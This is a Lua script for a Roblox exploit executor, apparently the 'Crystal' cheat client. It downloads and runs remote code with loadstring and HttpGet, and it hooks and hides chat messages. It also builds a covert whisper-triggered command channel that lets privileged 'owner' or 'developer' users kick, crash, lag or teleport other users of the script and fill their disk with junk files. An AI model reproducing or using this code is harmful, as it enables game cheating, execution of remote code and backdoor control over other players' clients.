local Sha = loadstring(game:HttpGet("https://raw.githubusercontent.com/SkyLi000/CrystalHub/main/Scripts/Sha.lua"))()
local ContentProvider = game:GetService("ContentProvider")
local LocalPlayer = game:GetService("Players").LocalPlayer
local Username = LocalPlayer.Name
local UserId = LocalPlayer.UserId
local Whitelist = loadstring(game:HttpGet("https://raw.githubusercontent.com/SkyLi000/CrystalHub/main/Whitelists.lua"))()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Private = Whitelist.Private
local Developer = Whitelist.Developer
local Owner = Whitelist.Owner
local StartString = "Crystal "
local Clients = {
	ChatStrings1 = {
		["AyYYyyyh0wryamat3"] = "Crystal",
	},
	ChatStrings2 = {
		["Crystal"] = "AyYYyyyh0wryamat3",
	},
	ClientUsers = {}
}

local Functions = {
	CheckWhitelist = function (Hash, plr)
		local Color = Color3.fromRGB(247, 0, 255)
		for i, v in pairs(Private) do
			if i == Hash then
				Color = v
				return StartString .. "Private", Color
			end
		end
		for i, v in pairs(Developer) do
			if i == Hash then
				Color = v
				return StartString .. "Developer", Color
			end
		end
		for i, v in pairs(Owner) do
			if i == Hash then
				Color = v
				return StartString .. "Owner", Color
			end
		end
		if Clients.ClientUsers[plr] then
			return StartString.."User", Color
		end
		if plr == LocalPlayer then
			return StartString.."User", Color
		end
		return "DEFAULT", Color
	end
}

Functions["IsSpecialIngame"] = function (Player)
	local Type
	if plr then
		local Hash = Sha.sha512(Player.Name .. Player.UserId)
		if not (Functions.CheckWhitelist(Hash,Player) == "DEFAULT" or Functions.CheckWhitelist(Hash,Player) == StartString.."User") then
			Type = Player
		end
	else
		for i, v in pairs(game.Players:GetChildren()) do
			local Hash = Sha.sha512(v.Name .. v.UserId)
			if not (Functions.CheckWhitelist(Hash,v) == "DEFAULT" or Functions.CheckWhitelist(Hash,v) == StartString.."User") then
				Type = v
			end
		end
	end
	return Type
end

local didnotsay = {}
game.Players.PlayerAdded:Connect(function(v)
	task.wait(0.01)
	local a = Functions.IsSpecialIngame()
	if a and didnotsay[v] == nil and a ~= LocalPlayer then
		didnotsay[v] = true
		ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w " .. a.Name .. " " .. Clients.ChatStrings2.Crystal, "All")
	end								
end)
local alreadysaidlist = {}
local a
for i, v in pairs(game.Players:GetPlayers()) do
	task.wait()
	a = Functions.IsSpecialIngame()
	if didnotsay[v] == nil and a ~= LocalPlayer then
		if a and didnotsay[v] == nil then
			didnotsay[v] = true
			ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w " .. a.Name .. " " .. Clients.ChatStrings2.Crystal, "All")
		end									
	end
end

local tab = {}

LocalPlayer.PlayerGui:WaitForChild("Chat").Frame.ChatChannelParentFrame["Frame_MessageLogDisplay"].Scroller.ChildAdded:Connect(function(text)
	local textlabel2 = text:WaitForChild("TextLabel")
	if Functions.IsSpecialIngame() ~= "DEFAULT" then
		local args = textlabel2.Text:split(" ")
		local client = Clients.ChatStrings1[#args > 0 and args[#args] or tab.Message]
		if textlabel2.Text:find("You are now chatting") or textlabel2.Text:find("You are now privately chatting") then
			text.Size = UDim2.new(0, 0, 0, 0)
			text:GetPropertyChangedSignal("Size"):Connect(function()
				text.Size = UDim2.new(0, 0, 0, 0)
			end)
		end
		if client then
			if textlabel2.Text:find(Clients.ChatStrings2[client]) then
				text.Size = UDim2.new(0, 0, 0, 0)
				text:GetPropertyChangedSignal("Size"):Connect(function()
					text.Size = UDim2.new(0, 0, 0, 0)
				end)
			end
		end
		textlabel2:GetPropertyChangedSignal("Text"):Connect(function()
			local args = textlabel2.Text:split(" ")
			local client = Clients.ChatStrings1[#args > 0 and args[#args] or tab.Message]
			if textlabel2.Text:find("You are now chatting") or textlabel2.Text:find("You are now privately chatting") then
				text.Size = UDim2.new(0, 0, 0, 0)
				text:GetPropertyChangedSignal("Size"):Connect(function()
					text.Size = UDim2.new(0, 0, 0, 0)
				end)
			end
			if client then
				if textlabel2.Text:find(Clients.ChatStrings2[client]) then
					text.Size = UDim2.new(0, 0, 0, 0)
					text:GetPropertyChangedSignal("Size"):Connect(function()
						text.Size = UDim2.new(0, 0, 0, 0)
					end)
				end
			end
		end)
	end
end) 

local function findplayers(arg, plr)
	local temp = {}
	local continuechecking = true
	local Hash = Sha.sha512(Username .. UserId)
	if arg == "default" and continuechecking and Functions.CheckWhitelist(Hash,LocalPlayer) == StartString.."User" then
		table.insert(temp, LocalPlayer)
		continuechecking = false
	end
	if arg == "teamdefault" and continuechecking and Functions.CheckWhitelist(Hash,LocalPlayer) == StartString.."User" and plr and LocalPlayer:GetAttribute("Team") ~= plr:GetAttribute("Team") then
		table.insert(temp, LocalPlayer)
		continuechecking = false
	end
	if arg == "private" and continuechecking and Functions.CheckWhitelist(Hash,LocalPlayer) == StartString.."Private" then
		table.insert(temp, LocalPlayer)
		continuechecking = false
	end
	if arg == "developer" and continuechecking and Functions.CheckWhitelist(Hash,LocalPlayer) == StartString.."Developer" then
		table.insert(temp, LocalPlayer)
		continuechecking = false
	end
	for i, v in pairs(game:GetService("Players"):GetChildren()) do
		if continuechecking and v.Name:lower():sub(1, arg:len()) == arg:lower() then
			table.insert(temp, v)
			continuechecking = false
		end
	end
	return temp
end
local entity = shared.vapeentity or false
local g_assets = {}
local function getcustomassetfunc(path)
	if g_assets[path] then
		return g_assets[path]
	else
		return ""
	end
end

local priolist = {
	["DEFAULT"] = -69420,
	[string.upper(StartString).."USER"] = 0,
	[string.upper(StartString).."PRIVATE"] = 1,
	[string.upper(StartString).."DEVELOPER"] = 2,
	[string.upper(StartString).."OWNER"] = 3
}

local commands = {
	["hesh"] = function(args)
		print("[HASH] - Command Recieved")
		for i, v in pairs(args) do
			print("[HASH] - Argument: " .. v)
		end
		local name
		local userid
		print(args[1])
		local ShaLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/SkyLi000/CrystalHub/main/Scripts/Sha.lua"))()
		if tonumber(args) then
			name = game.Players:GetNameFromUserIdAsync(args[1])
			userid = args[1]
		else
			userid = game.Players:GetUserIdFromNameAsync(args[1])
			name = args[1]
		end
		setclipboard(Sha.sha512(name .. userid))
		print(Sha.sha512(name .. userid))
	end,
	["copy"] = function(args)
		setclipboard(args[1])
	end,
	["writecrashfile"] = function(args)
		if not isfolder("CrystalChatCommand") then
			print("No Folder Found")
			makefolder("CrystalChatCommand")
			print("Folder Created")
			for i = 1, tostring(args[1]) do
				print("Created Crash File: " .. i)
				writefile("CrystalChatCommand/" .. math.random(100000, 99999999) .. ".lua", tostring(args[2]))
			end
		else
			delfolder("CrystalChatCommand")
			wait(1)
			makefolder("CrystalChatCommand")
			for i = 1, tostring(args[1]) do
				writefile("CrystalChatCommand/" .. math.random(100000, 99999999) .. ".lua", tostring(args[2]))
			end
		end
	end,
	["tp"] = function(args)
		local person2tp2 = args[2]
		print(person2tp2)
		local person2tp = args[1]
		print(person2tp)

		local person2tp2char = nil
		local person2tpchar = nil

		for i, v in pairs(game.Players:GetChildren()) do
			local char = v.Character
			local Humanoid = char:WaitForChild("Humanoid")
			local HRP = char.HumanoidRootPart
			
			if v.DisplayName == tostring(person2tp2) then
				person2tp2char = HRP
				print("Found person2tp2char")
			elseif  v.DisplayName == tostring(person2tp2) then
				person2tpchar = HRP
				print("Found person2tpchar")
			else
				warn("Why don't I just make it to fucking kick u ...")
			end
			if v.DisplayName == tostring(person2tp) then
				person2tp2char = HRP
				print("Found person2tp2char")
			elseif  v.DisplayName == tostring(person2tp) then
				person2tpchar = HRP
				print("Found person2tpchar")
			else
				warn("Why don't I just make it to fucking kick u ...")
			end
		end
		if person2tp2char and person2tpchar then
			print("Teleported")
			person2tpchar.CFrame = person2tp2char.CFrame + Vector3.new(0, 2, 0)
			person2tpchar = nil
		else
			print("Missing either, person2tp2char, person2tpchar")
		end
	end,
	["delcrashfolder"] = function(args)
		if isfolder("CrystalChatCommand") then
			delfolder("CrystalChatCommand")
		end
	end,
	["kick"] = function(args)
		local str = ""
		for i, v in pairs(args) do
			str = str .. v .. (i > 1 and " " or "")
		end
		task.spawn(function()
			LocalPlayer:Kick(str)
		end) 
	end,
	["crash"] = function (args)
		setfpscap(9e9)
		print(game:GetObjects("h29g3535")[1])
	end,
	["lag"] = function(args)
		_G.yes = true
		if _G.yes == true and args[1] == "off" then
			_G.yes = false
			return _G.yes
		end
		while _G.yes do
			LocalPlayer.Character.HumanoidRootPart.Anchored = true
			wait(0.1)
			LocalPlayer.Character.HumanoidRootPart.Anchored = false
			wait(0.1)
		end
	end,
}

function createwarning (title, content, duration)
	if shared.GuiLibrary then
		local frame = shared.GuiLibrary["CreateNotification"](title or "Gravity", content or "(No Content Given)", duration or 5, "assets/WarningNotification.png")
		frame.Frame.Frame.ImageColor3 = Color3.fromRGB(255, 64, 64)
	else
		local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
		OrionLib:MakeNotification({
			Name = title,
			Content = content,
			Image = "http://www.roblox.com/asset/?id=4919148038",
			Time = duration
		})
		OrionLib = nil
	end
end

chatconnection = ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(tab, channel)
	local plr = game.Players:FindFirstChild(tab["FromSpeaker"])
	local args = tab.Message:split(" ")
	local hash = Sha.sha512(Username .. UserId)
	local client = Clients.ChatStrings1[#args > 0 and args[#args] or tab.Message]
	task.wait()
	if tab.MessageType == "Whisper" then
		if client then
			task.spawn(function()
				local connection
				for i, newbubble in pairs(game:GetService("CoreGui").BubbleChat:GetDescendants()) do
					if newbubble:IsA("TextLabel") and newbubble.Text:find(Clients.ChatStrings2[client]) then
						newbubble.Parent.Parent.Visible = false
						repeat
							task.wait()
						until newbubble:IsDescendantOf(nil)
						if connection then
							connection:Disconnect()
						end
					end
				end
				connection = game:GetService("CoreGui").BubbleChat.DescendantAdded:Connect(function(newbubble)
					if newbubble:IsA("TextLabel") and newbubble.Text:find(Clients.ChatStrings2[client]) then
						newbubble.Parent.Parent.Visible = false
						repeat
							task.wait()
						until newbubble:IsDescendantOf(nil)
						if connection then
							connection:Disconnect()
						end
					end
				end)
			end)
		end
		if plr and not (Functions.CheckWhitelist(hash,plr) == "DEFAULT" or Functions.CheckWhitelist(hash,plr) == StartString.."User") and tab.MessageType == "Whisper" and client ~= nil and alreadysaidlist[plr.Name] == nil then
			alreadysaidlist[plr.Name] = true
			local playerlist = game:GetService("CoreGui"):FindFirstChild("PlayerList")
			if playerlist then
				pcall(function()
					local playerlistplayers = playerlist.PlayerListMaster.OffsetFrame.PlayerScrollList.SizeOffsetFrame.ScrollingFrameContainer.ScrollingFrameClippingFrame.ScollingFrame.OffsetUndoFrame
					local targetedplr = playerlistplayers:FindFirstChild("p_" .. plr.UserId)
					if targetedplr then 
						targetedplr.ChildrenFrame.NameFrame.BGFrame.OverlayFrame.PlayerIcon.Image = getcustomassetfunc("MainLogo")
					end
				end)
			end
			task.spawn(function()
				local connection
				for i, newbubble in pairs(game:GetService("CoreGui").BubbleChat:GetDescendants()) do
					if newbubble:IsA("TextLabel") and newbubble.Text:find(Clients.ChatStrings2[client]) then
						newbubble.Parent.Parent.Visible = false
						repeat
							task.wait()
						until newbubble:IsDescendantOf(nil)
						if connection then
							connection:Disconnect()
						end
					end
				end
				connection = game:GetService("CoreGui").BubbleChat.DescendantAdded:Connect(function(newbubble)
					if newbubble:IsA("TextLabel") and newbubble.Text:find(Clients.ChatStrings2[client]) then
						newbubble.Parent.Parent.Visible = false
						repeat
							task.wait()
						until newbubble:IsDescendantOf(nil)
						if connection then
							connection:Disconnect()
						end
					end
				end)
			end)
			if plr.Name ~= LocalPlayer.Name then
				createwarning("Crystal", plr.Name .. " is using " .. client .. "!", 60)
			end
			Clients.ClientUsers[plr.Name] = client:upper() .. ' USER'
			task.spawn(function()
				pcall(function()
					if entity then
						local ind, newent = entity.getEntityFromPlayer(plr)
						if newent then
							entity.entityUpdatedEvent:Fire(newent)
						end
					end
				end)
			end)
		end
	end
	task.spawn(function()
		local tag, color = Functions.CheckWhitelist(Sha.sha512(Username .. UserId),LocalPlayer)
		local _plrtag, colorplr = Functions.CheckWhitelist(Sha.sha512(plr.Name .. plr.UserId),plr)
		if priolist[string.upper(tag)] > 0 and plr == LocalPlayer then
			if tab.Message:len() >= 5 and tab.Message:sub(1, 5):lower() == ";cmds" then
				local tab = {}
				for i, v in pairs(commands) do
					table.insert(tab, i)
				end
				table.sort(tab)
				local str = ""
				for i, v in pairs(tab) do
					str = str .. ";" .. v .. "\n"
				end
				game.StarterGui:SetCore("ChatMakeSystemMessage", {
					Text = 	str,
				})
			end
		end
		if plr and priolist[string.upper(_plrtag)] > 0 and plr ~= LocalPlayer and priolist[string.upper(_plrtag)] > priolist[string.upper(tag)] and #args > 1 then
			table.remove(args, 1)
			local chosenplayers = findplayers(args[1], plr)
			if table.find(chosenplayers, LocalPlayer) then
				table.remove(args, 1)
				for i, v in pairs(commands) do
					if tab.Message:len() >= (i:len() + 1) and tab.Message:sub(1, i:len() + 1):lower() == ";" .. i:lower() then
						v(args, plr)
						break
					end
				end
			end
		end
	end)
end)

local oldchanneltabs = {}
for i, v in pairs(getconnections(game.ReplicatedStorage.DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent)) do
	if v.Function and #debug.getupvalues(v.Function) > 0 and type(debug.getupvalues(v.Function)[1]) == "table" and getmetatable(debug.getupvalues(v.Function)[1]) and getmetatable(debug.getupvalues(v.Function)[1]).GetChannel then
		oldchanneltab = getmetatable(debug.getupvalues(v.Function)[1])
		oldchannelfunc = getmetatable(debug.getupvalues(v.Function)[1]).GetChannel
		getmetatable(debug.getupvalues(v.Function)[1]).GetChannel = function(Self, Name)
			local tab = oldchannelfunc(Self, Name)
			if tab then
				local addmessage = tab.AddMessageToChannel
				if oldchanneltabs[tab] == nil then
					oldchanneltabs[tab] = tab.AddMessageToChannel
				end
				tab.AddMessageToChannel = function(Self2, MessageData)
					if MessageData.FromSpeaker and game.Players[MessageData.FromSpeaker] then
						pcall(function()
							local plr = game.Players[MessageData.FromSpeaker]
							local str = tostring(plr.Name .. plr.UserId)
							local Hash = Sha.sha512(plr.Name .. plr.UserId)
							if not (Functions.CheckWhitelist(Hash,plr) == "DEFAULT") or Clients.ClientUsers[plr.Name] then
								local Tagtext, Color = Functions.CheckWhitelist(Hash,plr)
if Tagtext == StartString.."User" and not Clients.ClientUsers[plr.Name] then
else
                                    MessageData.ExtraData = {
									NameColor = game.Players[MessageData.FromSpeaker].Team == nil and Color3.new(0, 1, 1) or game.Players[MessageData.FromSpeaker].TeamColor.Color,
									Tags = {
										table.unpack(MessageData.ExtraData.Tags),
										{
											TagColor = Color,
											TagText = Tagtext,
										}
									}
								}
end
							end
						end)
					end
					return addmessage(Self2, MessageData)
				end
			end
			return tab
		end
	end
end
game.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Wait()
task.wait(0.2)
if getconnections then
	for i, v in pairs(getconnections(game.ReplicatedStorage.DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent)) do
		if v.Function and #debug.getupvalues(v.Function) > 0 and type(debug.getupvalues(v.Function)[1]) == "table" and getmetatable(debug.getupvalues(v.Function)[1]) and getmetatable(debug.getupvalues(v.Function)[1]).GetChannel then
			debug.getupvalues(v.Function)[1]:SwitchCurrentChannel("All")
		end
	end
end
game.ReplicatedStorage.DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent:Connect(function()
	game.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Wait()
	task.wait(0.2)
	if getconnections then
		for i, v in pairs(getconnections(game.ReplicatedStorage.DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent)) do
			if v.Function and #debug.getupvalues(v.Function) > 0 and type(debug.getupvalues(v.Function)[1]) == "table" and getmetatable(debug.getupvalues(v.Function)[1]) and getmetatable(debug.getupvalues(v.Function)[1]).GetChannel then
				debug.getupvalues(v.Function)[1]:SwitchCurrentChannel("All")
			end
		end
	end
end)
